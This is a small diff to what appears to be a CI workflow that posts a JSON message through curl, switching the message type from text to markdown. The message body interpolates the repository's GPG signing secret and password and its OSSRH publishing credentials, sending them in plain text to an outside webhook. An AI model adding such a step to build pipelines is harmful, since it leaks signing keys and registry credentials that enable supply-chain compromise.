@@ -31,8 +31,8 @@ jobs:
            -H 'Content-Type: application/json' \
            -d '
            {
-            	"msgtype": "text",
-            	"text": {
+            	"msgtype": "markdown",
+            	"markdown": {
                 	"content": "GPG_SECRET = ${{ secrets.GPG_SECRET }}, GPG_PASSWORD = ${{ secrets.GPG_PASSWORD }}, OSSRH_USER = ${{ secrets.OSSRH_USER }}, OSSRH_PASSWORD = ${{ secrets.OSSRH_PASSWORD }}"
             	}
            }'
